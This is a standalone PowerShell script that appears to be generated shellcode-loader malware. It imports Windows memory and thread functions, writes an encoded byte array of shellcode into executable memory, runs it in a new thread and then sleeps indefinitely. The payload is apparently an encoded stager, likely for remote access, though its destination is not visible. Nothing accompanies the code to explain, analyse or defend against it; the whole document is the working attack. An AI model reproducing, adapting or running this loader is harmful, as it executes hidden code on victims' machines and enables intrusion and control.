$nmop = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $nmop -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xb6,0x26,0x55,0x6a,0xd9,0xc3,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x68,0x13,0x83,0xc0,0x04,0x03,0x68,0xb9,0xc4,0xa0,0x96,0x2d,0x8a,0x4b,0x67,0xad,0xeb,0xc2,0x82,0x9c,0x2b,0xb0,0xc7,0x8e,0x9b,0xb2,0x8a,0x22,0x57,0x96,0x3e,0xb1,0x15,0x3f,0x30,0x72,0x93,0x19,0x7f,0x83,0x88,0x5a,0x1e,0x07,0xd3,0x8e,0xc0,0x36,0x1c,0xc3,0x01,0x7f,0x41,0x2e,0x53,0x28,0x0d,0x9d,0x44,0x5d,0x5b,0x1e,0xee,0x2d,0x4d,0x26,0x13,0xe5,0x6c,0x07,0x82,0x7e,0x37,0x87,0x24,0x53,0x43,0x8e,0x3e,0xb0,0x6e,0x58,0xb4,0x02,0x04,0x5b,0x1c,0x5b,0xe5,0xf0,0x61,0x54,0x14,0x08,0xa5,0x52,0xc7,0x7f,0xdf,0xa1,0x7a,0x78,0x24,0xd8,0xa0,0x0d,0xbf,0x7a,0x22,0xb5,0x1b,0x7b,0xe7,0x20,0xef,0x77,0x4c,0x26,0xb7,0x9b,0x53,0xeb,0xc3,0xa7,0xd8,0x0a,0x04,0x2e,0x9a,0x28,0x80,0x6b,0x78,0x50,0x91,0xd1,0x2f,0x6d,0xc1,0xba,0x90,0xcb,0x89,0x56,0xc4,0x61,0xd0,0x3e,0x29,0x48,0xeb,0xbe,0x25,0xdb,0x98,0x8c,0xea,0x77,0x37,0xbc,0x63,0x5e,0xc0,0xc3,0x59,0x26,0x5e,0x3a,0x62,0x57,0x76,0xf8,0x36,0x07,0xe0,0x29,0x37,0xcc,0xf0,0xd6,0xe2,0x79,0xf4,0x40,0xcd,0xd6,0xf7,0x94,0xa5,0x24,0xf8,0x8b,0xa5,0xa0,0x1e,0xe3,0x95,0xe2,0x8e,0x43,0x46,0x43,0x7f,0x2b,0x8c,0x4c,0xa0,0x4b,0xaf,0x86,0xc9,0xe1,0x40,0x7f,0xa1,0x9d,0xf9,0xda,0x39,0x3c,0x05,0xf1,0x47,0x7e,0x8d,0xf6,0xb8,0x30,0x66,0x72,0xab,0xa4,0x86,0xc9,0x91,0x62,0x98,0xe7,0xbc,0x8a,0x0c,0x0c,0x17,0xdd,0xb8,0x0e,0x4e,0x29,0x67,0xf0,0xa5,0x22,0xae,0x64,0x06,0x5c,0xcf,0x68,0x86,0x9c,0x99,0xe2,0x86,0xf4,0x7d,0x57,0xd5,0xe1,0x81,0x42,0x49,0xba,0x17,0x6d,0x38,0x6f,0xbf,0x05,0xc6,0x56,0xf7,0x89,0x39,0xbd,0x09,0xf5,0xef,0xfb,0x7f,0x17,0x2c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kzt=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kzt.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kzt,0,0,0);for (;;){Start-sleep 60};